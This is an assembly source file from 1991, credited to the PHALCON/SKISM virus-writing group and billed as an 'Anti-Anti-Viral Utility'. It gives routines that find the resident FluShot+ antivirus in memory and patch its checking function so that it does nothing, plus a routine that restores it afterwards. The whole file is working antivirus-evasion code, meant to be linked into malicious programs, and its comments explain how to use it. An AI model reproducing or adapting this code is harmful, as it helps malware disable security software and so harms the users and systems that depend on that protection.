; FLU_NOT.ASM þ Routines to be linked into your FluShot+ resistant
;             þ programs.
; Version 1.0 þ 27 November 1991
;
; Written by Dark Angel and Demogorgon of PHALCON/SKISM Co-op
; Look for more Anti-Anti-Viral Utilities from us!
;
; Notes:
;  This is different from the C routines.  Call Flu_Not to disable and
;  Flu_Restore to reenable (at the end of your program, of course).  Try
;  not to call Flu_Not more than once in your program.  To disable again,
;  simply use:
;    les si, dword ptr flu_off
;    mov es:[si], 593Ch
;  (actually, this probably won't work in the .ASM file, but you can write
;   the routine yourself and put it in this file.)

        Public  Flu_Not, Flu_Restore
CODE    SEGMENT BYTE PUBLIC  'CODE'
        ASSUME  CS:CODE
        org     100h

flu_off dd      0
flu_seg dd      0

Flu_Not Proc    Near
        push    ax
        push    bx
        push    bp
        mov     word ptr cs:[flu_seg], 0

        mov     ax, 0FF0Fh                      ; Check if FluShot+ resident
        int     21h
        cmp     ax, 0101h
        jnz     No_puny_flus                    ; If not, no work to be done
Kill_Puny_Flus:                                 ; Otherwise, find the
        push    es                              ; FluShot+ segment

        xor     ax, ax
        mov     es, ax
        mov     bx, 004Eh                       ; Get int 13h handler's
        mov     ax, es:[bx]                     ;  segment
        mov     es, ax                          ; ES is now FSEG - YES!

        mov     bp, 1000h                       ; Start at FSEG:1000
Froopy_Loopy:
        cmp     word ptr es:[bp], 593Ch         ; Try to find marker bytes
        jz      Happy_Loop                      ; NOTE: No need to set
        inc     bp                              ;  counter because FluShot+
        jmp     Froopy_Loopy                    ;  is guaranteed to be in
Happy_Loop:                                     ;  memory by the INT 21h call
        cmp     word ptr es:[bp], 'RP'          ; Look backwards for the
        jz      Found_It_Here                   ;  beginning of the function
        dec     bp
        jmp     Happy_Loop
; If you are paranoid, you can add other checks, such as
; (in Froopy_Loopy) cmp bp, 5000h, jz No_Puny_Flus and
; (in Happy_Loop) cmp bp, 1000h, jz No_Puny_Flus, but there
; is really no need.
Found_It_Here:
        mov     word ptr es:[bp], 0C3F8h        ; Key to everything - replace
        mov     word ptr cs:[flu_seg], es       ;  function's starting bytes
        mov     word ptr cs:[flu_off], bp       ; Save the flu_offset
        pop     es
No_Puny_Flus:
        pop     bp
        pop     bx
        pop     ax
        ret
Flu_Not Endp

Flu_Restore Proc Near
        push    ax
        push    bx
        push    es
        les     bx, dword ptr cs:[offset flu_off]      ; Load ES:BX with Seg:Off
        mov     ax, es
        or      ax, ax
        jz      No_FluShot

        mov     word ptr es:[bx], 5250h

No_FluShot:
        pop     es
        pop     bx
        pop     ax
        ret
Flu_Restore Endp

CODE    ENDS
        END
